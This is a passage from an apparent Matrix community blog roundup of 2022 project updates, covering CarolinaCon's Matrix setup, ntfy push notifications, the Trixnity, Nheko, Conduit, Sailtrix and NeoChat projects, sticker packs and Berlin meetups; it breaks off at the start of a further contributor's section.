&lt;p&gt;CarolinaCon is a yearly cybersecurity conference hosted out of North Carolina. Since 2004 CarolinaCon has been host to talks ranging from BioHacking, to developing OpenBSD, to Web app security, and beyond. Over the years we have run a wide range of events, mostly in person. The past two years we decided to run the conference online. &lt;a href=&quot;https:&#x2F;&#x2F;carolinacon.org&#x2F;&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;gen3 mentions&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;h3&gt;whoami&lt;&#x2F;h3&gt;
&lt;p&gt;CarolinaCon is a yearly cybersecurity conference hosted out of North Carolina. Since 2004 CarolinaCon has been host to talks ranging from BioHacking, to developing OpenBSD, to Web app security, and beyond. Over the years we have run a wide range of events, mostly in person. The past two years we decided to run the conference online.&lt;&#x2F;p&gt;
&lt;h3&gt;How did we use matrix?&lt;&#x2F;h3&gt;
&lt;p&gt;We decided to run a homeserver bridged with our discord. We wanted to take careful consideration to users who have never used matrix before, and offer some background information to enable them to use it even if they were feeling unsure. Along with running our own homeserver and element instance, We also made a Space that users can join to automatically see all the rooms available for the conference. When a user creates an account on our homeserver, they are automatically placed in a few key rooms such as the Space, #CTF, #general, and #announcements. Check it out on &lt;a href=&quot;https:&#x2F;&#x2F;carolinacon.org&#x2F;coms.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;https:&#x2F;&#x2F;carolinacon.org&#x2F;coms.html&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;We didn&#x27;t want anyone to feel left out, so all rooms are mirrored. One challenge this faced was getting permissions to work properly with rooms such as #announcements. The usage of a Space was generally positive in terms of increasing room desirability in Matrix. It was also nice to be able to include the local 2600 room into our space, something that we couldn&#x27;t do with Discord.&lt;&#x2F;p&gt;
&lt;h3&gt;Stats&lt;&#x2F;h3&gt;
&lt;p&gt;We already had a large userbase on discord, but still had good user interaction on both sides. 150 users interacted in the #general chat. Of those users, 113 were from discord. Of the 37 Matrix only users, we had 7 separate homeservers. Its really cool to see that people who where already on Matrix, decided to federate in. Almost all homeservers had more then one person join, which is good to see.&lt;&#x2F;p&gt;
&lt;p&gt;In the future as we go back to in an person conference, we will continue to run the an online portion. The community seemed to really enjoy it, and we consider it a success as we were able to increase our outreach to world wide. Check us out at &lt;a href=&quot;https:&#x2F;&#x2F;carolinacon.org&#x2F;&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;https:&#x2F;&#x2F;carolinacon.org&#x2F;&lt;&#x2F;a&gt; , we would love to chat!&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Google-free push notifications with UnifiedPush and Ntfy&lt;&#x2F;h2&gt;
&lt;p&gt;Using the &lt;a href=&quot;https:&#x2F;&#x2F;unifiedpush.org&#x2F;&quot;&gt;UnifiedPush open standard&lt;&#x2F;a&gt;, ntfy enables self-hosted (Google-free) push notifications. &lt;a href=&quot;https:&#x2F;&#x2F;wrily.foad.me.uk&#x2F;unifiedpush-notifications-for-your-matrix-server-with-ntfy&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;JulianF reports&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;In the interests of supporting Open Tech in general, I made a small contribution to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&quot;&gt;matrix-docker-ansible-deploy&lt;&#x2F;a&gt;: it can now install the &lt;a href=&quot;https:&#x2F;&#x2F;ntfy.sh&#x2F;&quot;&gt;ntfy&lt;&#x2F;a&gt; push notifications server for you.&lt;&#x2F;p&gt;
&lt;p&gt;To explain what it&#x27;s for: Using the &lt;a href=&quot;https:&#x2F;&#x2F;unifiedpush.org&#x2F;&quot;&gt;UnifiedPush open standard&lt;&#x2F;a&gt;, ntfy enables self-hosted (Google-free) push notifications. The notifications go from Matrix (and other) servers, to our self-hosted ntfy server, and then straight to our phone. Especially useful for users of &lt;a href=&quot;https:&#x2F;&#x2F;wrily.foad.me.uk&#x2F;all-i-want-for-christmas-is&quot; title=&quot;A smart phone that doesn&#x27;t own me&quot;&gt;Google-free Android&lt;&#x2F;a&gt; phones, and others who want to reduce their dependence on big tech.&lt;&#x2F;p&gt;
&lt;p&gt;To set it up, see &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;docs&#x2F;configuring-playbook-ntfy.md&quot;&gt;Setting up the ntfy push notifications server&lt;&#x2F;a&gt; in the playbook docs.&lt;&#x2F;p&gt;
&lt;p&gt;Read about it on my blog: &lt;a href=&quot;https:&#x2F;&#x2F;wrily.foad.me.uk&#x2F;unifiedpush-notifications-for-your-matrix-server-with-ntfy&quot;&gt;UnifiedPush notifications for your Matrix server with ntfy&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Paul&#x27;s updates and blog posts&lt;&#x2F;h2&gt;
&lt;p&gt;Paul shares what they did in 2022. &lt;a href=&quot;https:&#x2F;&#x2F;paul.totterman.name&#x2F;&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Paul mentions&lt;&#x2F;p&gt;&lt;blockquote&gt;
I haven&#x27;t had much time, but I did write two tiny projects and small blog posts: &lt;a href=&quot;https:&#x2F;&#x2F;paul.totterman.name&#x2F;posts&#x2F;matrix-menu-bot&#x2F;&quot;&gt;https:&#x2F;&#x2F;paul.totterman.name&#x2F;posts&#x2F;matrix-menu-bot&#x2F;&lt;&#x2F;a&gt; &amp;amp; &lt;a href=&quot;https:&#x2F;&#x2F;paul.totterman.name&#x2F;posts&#x2F;remarkable-matrix&#x2F;&quot;&gt;https:&#x2F;&#x2F;paul.totterman.name&#x2F;posts&#x2F;remarkable-matrix&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Open Tech Will Save Us on PeerTube&lt;&#x2F;h2&gt;
&lt;p&gt;Hosting of the Open Tech Will Save Us talks on PeerTube. &lt;a href=&quot;https:&#x2F;&#x2F;wrily.foad.me.uk&#x2F;open-tech-will-save-us-on-peertube&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;JulianF mentions&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;wrily.foad.me.uk&#x2F;open-tech-will-save-us-on-peertube&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;https:&#x2F;&#x2F;wrily.foad.me.uk&#x2F;open-tech-will-save-us-on-peertube&lt;&#x2F;a&gt; -- I am publishing the Open Tech Will Save Us (OTWSU) talks on an Open Tech platform — namely on my own instance of Peertube. -- Thanks to Harald for doing it first. -- This article talks more about why, how, etc. &lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;This Year in Trixnity&lt;&#x2F;h2&gt;
&lt;p&gt;Trixnity is a multiplatform Matrix SDK written in Kotlin. You can write clients, bots, appservices and servers with it. This SDK supports JVM (also Android), JS and Native as targets for most modules. Ktor is used for the HTTP client&#x2F;server and kotlinx.serialization for the serialization&#x2F;deserialization. &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.com&#x2F;trixnity&#x2F;trixnity&#x2F;&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Benedict mentions&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;Trixnity made some huge steps towards a fully featured cross platform matrix SDK written in Kotlin.&lt;&#x2F;p&gt;
&lt;p&gt;Starting with version 1.0.0 in January I added support for cross signing, secrets and key backup.&lt;&#x2F;p&gt;
&lt;p&gt;Version 2.0.0 in April included a large refactoring. This allows you to share a lot code between server and client implementations of the Matrix APIs. For example you can now implement a server with Trixnity. Also Olm has been bundled into most release files, push rules are evaluated, there is a new better TimelineEvent retrieving API and many more. JS has been enabled for the last module, so Trixnity is now fully multiplatform capable. With v2.3.0 dependency injection has been added to Trixnity to make it even more configurable.&lt;&#x2F;p&gt;
&lt;p&gt;The next big release 3.0.0 was in November. We added support for realm as database backend (e. g. for iOS), allowed to exchange the MediaStore, calculate power levels and many more. Some APIs in trixnity-client has been purified, because I improved the StateFlowCache. The developer experience has increased even more with 3.1.0 in December. It adds a completely new Timeline abstraction.&lt;&#x2F;p&gt;&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Matrix Community Summit 2022 Berlin&lt;&#x2F;h2&gt;
&lt;p&gt;The Matrix Community Summit 2022 in Berlin was a conference entirely focused on Matrix. &lt;a href=&quot;https:&#x2F;&#x2F;cfp.summit2022.matrixmeetup.de&#x2F;matrix-summit-conference-2022&#x2F;&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;jaller94 contributes&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;Where do I even begin? This has been such a great and fun event.&lt;br&#x2F;&gt;On the last days of August more than 60 Matrix enthusiasts from various countries met at c-base in Berlin.&lt;br&#x2F;&gt;We started with a Barcamp day for attendees to discuss spontaneous topics.&lt;br&#x2F;&gt;The highlight have been two days with 36 presentations and workshops on three stages.&lt;br&#x2F;&gt;Check out the schedule, if you want to contact some of the speakers: &lt;a href=&quot;https:&#x2F;&#x2F;cfp.summit2022.matrixmeetup.de&#x2F;matrix-summit-conference-2022&#x2F;schedule&#x2F;&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;https:&#x2F;&#x2F;cfp.summit2022.matrixmeetup.de&#x2F;matrix-summit-conference-2022&#x2F;schedule&#x2F;&lt;&#x2F;a&gt;&lt;br&#x2F;&gt;Thanks to all attendees for the great conversations we&#x27;ve had! Thanks to all presenters for a schedule full of Matrix knowledge! Thanks to the c-base hackerspace for hosting us! Thanks to the sponsors for paying for the food and drinks!&lt;&#x2F;p&gt;
&lt;p&gt;For those who missed this in-person event or wish to revive some of the memories, we&#x27;re publishing interviews with some community members as a podcast.&lt;br&#x2F;&gt;In total there are 2 English and 6 German episodes, the last one being published on Fri, 3rd Jan 2023.&lt;br&#x2F;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;anchor.fm&#x2F;matrix-podcast0&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;https:&#x2F;&#x2F;anchor.fm&#x2F;matrix-podcast0&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Nheko&lt;&#x2F;h2&gt;
&lt;p&gt;The motivation behind the project is to provide a native desktop app for Matrix that feels more like a mainstream chat app (Element, Telegram etc) and less like an IRC client. &lt;a href=&quot;https:&#x2F;&#x2F;nheko-reborn.github.io&#x2F;&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Nico reports&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;What a year, eh? I don&#x27;t know if as much happened in your lives as did in mine, but certainly stuff happened! And that certainly was the case for Nheko too! There have been plenty of new and returning faces. Before I go into more detail what happened with Nheko, I&#x27;d like to prefix it with a thank you to some specific people, who noticeably contributed to Nheko in the last year on a regular basis:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;LorenDB, who while causing us a lot of trouble by breaking stuff, also tackles many of the more annoying issues and brings a lot of creativity to problems and their solutions.&lt;&#x2F;li&gt;
&lt;li&gt;MaltE, who despite being usually busy, reworked most of our mobile UI and gave Nheko a pretty bubble mode.&lt;&#x2F;li&gt;
&lt;li&gt;q234rty, who seems to have a solution to every issue and even upstreamed some of those patches to the KDE Qt collection, so that some of the annoying Wayland bugs won&#x27;t bother many users anymore.&lt;&#x2F;li&gt;
&lt;li&gt;Linerly, Priit and many of the other translators, who tirelessly keep our translations up to date, even if they have to re-translate whole paragraphs after I fixed a single comma...&lt;&#x2F;li&gt;
&lt;li&gt;And many of the other contributors and the community, who report and fix issues as well as just make the whole journey more enjoyable!&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Now with that out of the way, where are we going?&lt;&#x2F;p&gt;
&lt;p&gt;Nheko got plenty of new features, even though some of them I tried hard to avoid for a long time! For example you can now send confetti. I prefer to toggle that off, because I think it can be distracting, but it is undeniable, that it looks very fun and fun is very important!&lt;&#x2F;p&gt;
&lt;p&gt;Another one is threads. Nheko now supports them, but I would have liked for threads to work differently. Some features, like notification counts for each thread, we skip out on, since it seems very hard to support well. Instead we integrate threads into the timeline and you can filter them out. Ideally threads would behave like dynamic subrooms, with titles and listed below the room list entry, but that seems not doable with the current design of threads in the specification. So we chose a design, that is still useful, but doesn&#x27;t run into such limitations.&lt;&#x2F;p&gt;
&lt;p&gt;Apart from that we really started investing into our communities support (which is how we call our UX for spaces). While showing communities as a filter is already useful, you can now also modify those filters. Nheko now shows you notification counts, suggests you to join the space for a community (if possible) and allows you to apply permission changes across the whole community.&lt;&#x2F;p&gt;
&lt;p&gt;Speaking of permissions, we invested a lot into improving our management and moderation tooling. With this you can now fine tune join rules for a room (with toggles for knocking, restricted joins and more), edit the permissions using a role-like interface, edit the addresses for a room, edit your sticker packs and more. You can also knock on rooms now, which is a way to request access to a room without it having to be public or manually messaging someone for an invite and we can now show policy lists.&lt;&#x2F;p&gt;
&lt;p&gt;Oh, one thing that definitely deserves a mention, we had our first official CVE! Now, you might think that is not worth celebrating, but it does feel like Nheko is growing up. Partially this is thanks to Github making it easy to file CVEs for security issues though. Who would have thought we ever would have our own CVE entry? We certainly need to improve our test coverage and hardening against such issues, though to be fair in this case I pretty much already wrote a comment about what the problem would be, but just didn&#x27;t fix it properly... We however are also constantly improving our encryption in general, so hopefully it only becomes more secure from now on. Part of that is fallback keys, which make it easier to come back after a long period away.&lt;&#x2F;p&gt;
&lt;p&gt;Nheko now also evaluates notifications locally. This is especially great for encrypted rooms, since before the server mostly guessed what should notify or not. But it also means you get highlighted when mentioned now, which makes it much easier to find where you were notified. We also now have a line where you last left off reading the room, which is much more useful than I initially wanted to admit and I use it a lot. We also have experimental support for MSC3664, which allows us to hopefully eventually get rid of reply fallbacks, by evaluating the reply relation instead of relying on every message to include the name of who you replied to for highlight purposes...&lt;&#x2F;p&gt;
&lt;p&gt;We also improved performance, however as always anytime you do, you end up adding features, that slow you down again. However current Nheko should still start up significantly faster than 2021 Nheko.&lt;&#x2F;p&gt;
&lt;p&gt;Speaking of improvements, we have made a few for macOS this year. Apple Silicon is now natively supported, so Rosetta is no longer needed to run Nheko. This means improved battery life and performance! At least on Apple Silicon, launching Nheko on macOS should now be roughly as fast as Alt+Tab-ing to another window. Additionally, you can now reply to messages straight from the notification in the Notification Center.&lt;&#x2F;p&gt;
&lt;p&gt;One thing I didn&#x27;t imagine we would ever have is a D-Bus API. This means you now can do some limited interactions with Nheko via the D-Bus API, like switching rooms using KRunner or Rofi! For FOSDEM we also added some support for widgets, because I wanted to be able to participate in the online FOSDEM without running a second client. This however is an incomplete experience, since... why run a browser in Nheko, if you have a perfectly capable browser client you can use for widgets? Nheko just shows you how to open a widget in a browser.&lt;&#x2F;p&gt;
&lt;p&gt;As already mentioned, we also significantly improved our support for the PinePhone. We now have a bubble layout, which looks better on mobile than the normal layout without bubbles. There has been significant work to make dialogs fit on mobile screens as well as allowing interaction using touch in almost all places. If you want to play with a PinePhone, definitely give Nheko a try and tell us, how you like it!&lt;&#x2F;p&gt;
&lt;p&gt;You might have noticed that we spent a lot of work on moderation tooling and that is probably something we will continue. I have a lot of ideas on how to integrate policy lists with spaces as well as using them to auto-decline invites, automatically ban people and more. How cool would it be if you could ban people community wide using a &amp;quot;banned members&amp;quot; editor in Nheko that is compatible with Mjolnir? And have permissions in spaces apply globally, maybe with some tweaks based on room types? There are a lot of cool ideas out there and we will certainly be experimenting with them.&lt;&#x2F;p&gt;
&lt;p&gt;Another topic will be building out our call support. I want to be able to use Nheko for my gaming sessions. Just drop into a voice chat room and talk to each other. Maybe do my work conference calls, including presentations as well or do remote help for my parents and grandparents over Matrix! We also really need to support calls on other platforms.&lt;&#x2F;p&gt;
&lt;p&gt;Which brings us on the last big goal: We do want to eventually switch to Qt6. We did have a branch testing out how difficult that would be and it was doable, but we were mostly blocked on GStreamer not supporting Qt6 yet. This is fixed in GStreamer 1.24, which should be out soon, so this is probably the time we can start looking into finalizing the port. Qt6 will fix A LOT of Wayland issues and give us a lot of new optimization opportunities. Maybe that is the year we can get below 100MB RAM usage on my ever growing account and make every room switch feel instant.&lt;&#x2F;p&gt;
&lt;p&gt;Well... this was a bit of a long one? Certainly it wasn&#x27;t the work of one person. The Nheko community seems to just be constantly growing and there are so many people contributing, that it really makes me love open source! Thank you! All of you! It has been a great year (Nheko wise) and I hope 2023 becomes even greater! Have a great year!&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;neko.dev_qiXeJLZOYzYGDltLQptSTZxb.png&quot; style=&quot;display: inline-block;&quot;&#x2F;&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Timo Kösters&#x27; year in Matrix&lt;&#x2F;h2&gt;
&lt;p&gt;Timo gives an update about Conduit and their year on Matrix. &lt;a href=&quot;https:&#x2F;&#x2F;conduit.rs&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Timo on Conduit ⚡️ tells us&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;Hello everyone, I am the maintainer of the Conduit Matrix project and this year my goal was to make Conduit more reliable. I&#x27;ve released three major updates this year, going from v0.2 to v0.5:&lt;&#x2F;p&gt;
&lt;p&gt;For example, the admin room received a lot of love this year. It&#x27;s a Conduit-specific way of controlling the Matrix server using a chat bot. Commands are parsed using &lt;code&gt;clap&lt;&#x2F;code&gt; and perform actions like creating or deactivating users, adding appservices or listing rooms.&lt;&#x2F;p&gt;
&lt;p&gt;Conduit now supports RocksDB as the database, which is better than the previous ones, but still has some problems. I have worked on a new database abstraction layer that would allow using PostgreSQL in the future.&lt;&#x2F;p&gt;
&lt;p&gt;I have also worked on all sorts of bug fixes. End-to-end encrypted chats work reliably, Server ACLs are respected, the user directory hides private users and so on.&lt;&#x2F;p&gt;
&lt;p&gt;These and many, many other fixes allow me to use Conduit for most of my Matrix interactions now and most of the issues I encounter are client and not server bugs, see &lt;a href=&quot;https:&#x2F;&#x2F;conduit.rs&#x2F;issues&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;https:&#x2F;&#x2F;conduit.rs&#x2F;issues&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;My goal for 2023 is adding all the modern features we need to be competitive with Synapse, like threading, space exploration, registration tokens and so on.&lt;&#x2F;p&gt;
&lt;p&gt;I also want to contribute to the Matrix spec and implement my ideas in Conduit, for example changing state resolution to speed up room joining.&lt;&#x2F;p&gt;
&lt;p&gt;I can&#x27;t promise to finish all of this next year. I will finish my Bachelor&#x27;s degree next year and for now I&#x27;m a full time student working on these things in the remaining time.&lt;&#x2F;p&gt;
&lt;p&gt;Thanks to all my individual sponsors this year and to FUTO ( &lt;a href=&quot;https:&#x2F;&#x2F;futo.org&#x2F;&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;https:&#x2F;&#x2F;futo.org&#x2F;&lt;&#x2F;a&gt; ) for making this worth it financially as well. &lt;a href=&quot;https:&#x2F;&#x2F;liberapay.com&#x2F;timokoesters&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;https:&#x2F;&#x2F;liberapay.com&#x2F;timokoesters&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Sticker&#x2F;emoji pack collection&lt;&#x2F;h2&gt;
&lt;p&gt;Tastytea maintains a collection of MSC2545 sticker pack rooms and gives an update about how the experience has been so far. &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;%23stickers-and-emojis%3Atastytea.de&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;tastytea mentions&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;At the end of 2021 i made a room with a Blobcat emoji pack, and since i could
not find a place to announce it, i started &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;%23stickers-and-emojis%3Atastytea.de&quot;&gt;a space to collect rooms with
sticker&#x2F;emoji packs&lt;&#x2F;a&gt;.
It began with 3 rooms and under 500 images, but with
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;2545&quot;&gt;MSC2545&lt;&#x2F;a&gt; getting
implemented in more and more clients in 2022, the space quickly grew and we&#x27;re
now at 7 rooms with more than 30 packs containing over 2000 stickers and emojis!
&lt;img data-mx-emoticon height=&quot;32&quot; src=&quot;&#x2F;blog&#x2F;img&#x2F;pixie.town_i2OfzCDAFTltAQ1BlFLITwjx.png&quot; alt=&quot;Blobcat tooting a party horn&quot; style=&quot;height: 2em;&quot;&#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;One thing i didn&#x27;t anticipate was that people started to request new stickers
and sometimes submitted their own. We&#x27;re not just collectors anymore but also
the prime source for Blobcats on Matrix!&lt;sup&gt;[citation needed]&lt;&#x2F;sup&gt;
If you have a sticker room too, please drop by our lobby and tell us
about it so we can list it and make it known to more people! Do you make your
own Blobcats or want to learn how to? Visit &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;%23tastytea_emojis%3Atastytea.de&quot;&gt;my
room&lt;&#x2F;a&gt;
so we can spread the blobby joy together! &lt;img data-mx-emoticon height=&quot;32&quot; src=&quot;&#x2F;blog&#x2F;img&#x2F;pixie.town_A5gZTcUCMSFX0H2ag1kOVkgw.png&quot; alt=&quot;Blobcat holding heart in its paws&quot; style=&quot;height: 2em;&quot;&#x2F;&gt;&lt;&#x2F;p&gt;&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Meetups in Berlin&lt;&#x2F;h2&gt;
&lt;p&gt;Berlin has a vivid Matrix community with not only one, but two Matrix meetups.&lt;&#x2F;p&gt;
&lt;p&gt;jaller94 tells us&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;Berlin has a vivid Matrix community with not only one, but two Matrix meetups.&lt;&#x2F;p&gt;
&lt;p&gt;Once a month, the Matrix User Meetup Berlin (MUMB) invites people to chat about Matrix and meet other users.&lt;br&#x2F;&gt;In summer this exchange of ideas and starting points into Matrix was sometimes combined with food from the BBQ grill.&lt;br&#x2F;&gt;For their upcoming events in 2023, check out the room &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#mumb:c-base.org&quot;&gt;#mumb:c-base.org&lt;&#x2F;a&gt;. It takes place at c-base on the first Wednesday of a month.&lt;br&#x2F;&gt;Thanks to the organiser &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;@saces:c-base.org&quot;&gt;saces&lt;&#x2F;a&gt; for bringing people together!&lt;&#x2F;p&gt;
&lt;p&gt;Furthermore, we have the Berliner Matrix Salon 🍷 (previously called Matrix Meetup Berlin, which made it hard to tell apart from the MUMB).&lt;br&#x2F;&gt;In the first half of 2022 we had regular meetups for developers and server admins to talk about their Matrix projects. This meetup eventually led to the Matrix Community Summit in August.&lt;br&#x2F;&gt;We still meet infrequently to discuss our projects and what public events we could host next. We&#x27;d love to host a series of presentations at various offices which also appeal to an audience outside the Matrix community (e.g. education, public sector and health care which have a growing Matrix adoption in Germany). Ping me or &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;@yan:datanauten.de&quot;&gt;Yan&lt;&#x2F;a&gt;, if you want to help by being a presenter, have access to an office or know of a particular audience in Berlin to bring Matrix to.&lt;br&#x2F;&gt;The room is &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#matrix-berlin:matrix.org&quot;&gt;#matrix-berlin:matrix.org&lt;&#x2F;a&gt;. Feel free to ask when we&#x27;re meeting next.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Sailtrix&lt;&#x2F;h2&gt;
&lt;p&gt;Sailtrix is a Matrix client for SailfishOS. &lt;a href=&quot;https:&#x2F;&#x2F;forum.sailfishos.org&#x2F;t&#x2F;sailtrix-matrix-client-supporting-end-to-end-encryption&#x2F;7199&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;HengYeDev contributes&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;The following major changes have been applied to Sailtrix in the year 2022, in no particular order:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Basic emoji verification&lt;&#x2F;li&gt;
&lt;li&gt;SSO Login&lt;&#x2F;li&gt;
&lt;li&gt;Create room&lt;&#x2F;li&gt;
&lt;li&gt;Integration with Sailfish.Share API&lt;&#x2F;li&gt;
&lt;li&gt;Room searching UI&lt;&#x2F;li&gt;
&lt;li&gt;and numerous cosmetic improvements and bugfixes&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;This year in NeoChat&lt;&#x2F;h2&gt;
&lt;p&gt;NeoChat is a client for Matrix, the decentralized communication protocol for instant messaging. It is a fork of Spectral, using KDE frameworks, most notably Kirigami, KConfig and KI18n. &lt;a href=&quot;https:&#x2F;&#x2F;invent.kde.org&#x2F;network&#x2F;neochat&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Tobias Fella mentions&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;It&#x27;s been an interesting year, that&#x27;s for sure :)&lt;&#x2F;p&gt;
&lt;p&gt;Let&#x27;s start with some statistics:&lt;&#x2F;p&gt;
&lt;p&gt;Some quick git magic shows 689 commits for this year so far; Roughly 200 of those were for translations.&lt;&#x2F;p&gt;
&lt;p&gt;On the topic of translations, NeoChat is currently (almost) fully translated into 17 languages, with 17 others being in progress.&lt;&#x2F;p&gt;
&lt;p&gt;One of the major areas of work this year - like last year - has been end-to-end-encryption, which, as of last week, is released in libQuotient and NeoChat. This means that you can now read new messages and verify your session with other devices. You won&#x27;t yet be able to recover from (most) undecryptable messages, we&#x27;re working on implementing those parts of the matrix specification.&lt;&#x2F;p&gt;
&lt;p&gt;NeoChat&#x27;s user interface saw major improvements this year:&lt;&#x2F;p&gt;
&lt;p&gt;The message list has been improved to be less buggy, adapt better to different form-factors and the different appearance options NeoChat offers, like the &amp;quot;compact&amp;quot; message style.&lt;&#x2F;p&gt;
&lt;p&gt;The compact style also recently gained a sibling in the equivalent style for the room list, which makes the list more compact by not showing the last message of the room.&lt;&#x2F;p&gt;
&lt;p&gt;Input handling has been overhauled, as a result user mentions are now highlighted while writing a message, making them more reliable and appear less magic to the user.&lt;&#x2F;p&gt;
&lt;p&gt;More new features include basic support for room search, improved emoji and reaction handling (including better emoji data, search and a skin tone selector), basic developer tools, support for showing and responding to polls and an improved account switcher. One of my personal highlights is support for collapsing large amounts of state events, which makes low-activity rooms significantly more pleasant to use.&lt;&#x2F;p&gt;
&lt;p&gt;On the moderation side, we&#x27;ve implemented support for reporting messages to the homeserver administrators and improved the kicking and banning support.&lt;&#x2F;p&gt;
&lt;p&gt;Progress on the space support has unfortunately been slower than hoped, with the only result of the GSoC project being the space list that is shown at the top of the room list. Space support will be one of the areas to work on in 2023.&lt;&#x2F;p&gt;
&lt;p&gt;Plasma users have gained some nice integration points with their desktop: File uploads and downloads will now be shown in plasma&#x27;s job tracker, there is now a D-Bus runner for opening rooms, and you can share messages with purpose-enabled apps.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, we&#x27;ve been working on improving NeoChat&#x27;s settings. Visually, the application and room settings have been ported to newer components that look significantly nicer, especially on mobile devices. We&#x27;ve also added settings for configuring room visibility, join rules and notifications and added support for configuring a proxy to use when connecting to a homeserver.&lt;&#x2F;p&gt;
&lt;p&gt;In terms of contributors, this year was better than last year, with several people becoming active in development and bug reporting. We&#x27;re especially excited about having been able to add James Graham as a third maintainer for NeoChat after all his work, focusing mostly on NeoChat&#x27;s front-end and settings.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;imbev&#x27;s year in Matrix&lt;&#x2F;h2&gt;
&lt;p&gt;imbev gives an update about what they have been up to this year.&lt;&#x2F;p&gt;
&lt;p&gt;imbev tells us&lt;&#x2F;p&gt;&lt;blockquote&gt;
